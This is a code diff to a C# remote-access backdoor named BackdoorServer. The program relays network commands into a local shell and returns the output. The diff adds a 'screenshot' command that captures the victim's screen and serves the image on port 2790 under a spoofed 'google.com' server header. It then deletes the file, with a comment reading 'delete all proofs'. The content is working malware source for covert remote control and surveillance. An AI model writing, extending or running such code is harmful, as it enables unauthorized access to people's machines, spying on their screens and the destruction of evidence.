@@ -5,6 +5,8 @@ using System.Net.Sockets;
 using System.Threading;
 using System.IO;
 using System.Text;
+using System.Drawing;
+using System.Windows.Forms;
 
 namespace BackdoorServer
 {
@@ -101,13 +103,15 @@ namespace BackdoorServer
 
         void SendShellOutput()
         {
-            string tempBuf = "";
-            while ((tempBuf = fromShell.ReadLine()) != null)
+            string buffer = "";
+            while ((buffer = fromShell.ReadLine()) != null)
             {
+                outStream.WriteLine(buffer + "\r");
+
+                // temporary, for logging to screen
                 Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.WriteLine(tempBuf);
+                Console.WriteLine(buffer);
                 Console.ResetColor();
-                outStream.WriteLine(tempBuf + "\r");
             }
             CloseShell();
         }
@@ -117,19 +121,78 @@ namespace BackdoorServer
             string tempBuff = "";
             while (((tempBuff = inStream.ReadLine()) != null))
             {
-                if (verbose) Console.WriteLine("Received command: " + tempBuff);
+                if (verbose) Console.WriteLine(">> " + tempBuff);
                 HandleCommand(tempBuff);
             }
         }
-        
+
         void HandleCommand(string command)
         {
-            if (command.Equals("q"))
+            switch (command)
             {
-                outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
-                CloseShell();
+                case Actions.SCREENSHOT:
+                    if (verbose) outStream.WriteLine("Taking a screenshot...");
+                    string path = MakeScreenshot();
+                    Console.WriteLine("Image is hosted at port 2790");
+                    outStream.WriteLine("Image is hosted at port 2790");
+                    HostScreenShot(path);
+                    Console.WriteLine("Image Sent < OK > !");
+                    // delete all proofs
+                    File.Delete(path);
+                    Console.WriteLine("Image deleted");
+                    if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
+                    break;
+                case Actions.QUIT:
+                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
+                    CloseShell();
+                    break;
+                default:
+                    toShell.WriteLine(command + "\r\n");
+                    break;
             }
-            toShell.WriteLine(command + "\r\n");
+        }
+
+        void HostScreenShot(string path)
+        {
+            string responseHeaders =
+                "HTTP/1.1 200 The file is coming right up!\r\n" +
+                    "Server: google.com\r\n" +
+                    "Content-Length: " + new FileInfo(path).Length + "\r\n" +
+                    "Content-Type: image/png\r\n" +
+                    "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
+                    "\r\n";
+
+            //headers should ALWAYS be ascii. Never UTF8
+            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
+
+            var lstr = new TcpListener(IPAddress.Any, Actions.SCREENSHOT_PORT);
+            lstr.Start();
+            Console.WriteLine("Waiting for client to connect...");
+            var webSocket = lstr.AcceptSocket();
+
+            webSocket.Send(headerBytes);
+            webSocket.SendFile(path);
+            webSocket.Close();
+        }
+
+        string MakeScreenshot()
+        {
+            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                            Screen.PrimaryScreen.Bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
+                {
+                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
+                                     Screen.PrimaryScreen.Bounds.Y,
+                                     0, 0,
+                                     bmpScreenCapture.Size,
+                                     CopyPixelOperation.SourceCopy);
+
+                    string savePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
+                    bmpScreenCapture.Save(savePath);
+                    return savePath;
+                }
+            }
         }
 
         void DropConnection()
@@ -189,6 +252,13 @@ namespace BackdoorServer
                 }
             }
             catch (Exception) { }
+        }
+
+        private static class Actions
+        {
+            public const string QUIT = "q";
+            public const string SCREENSHOT = "screenshot";
+            public const int SCREENSHOT_PORT = 2790;
         }
     }
 }
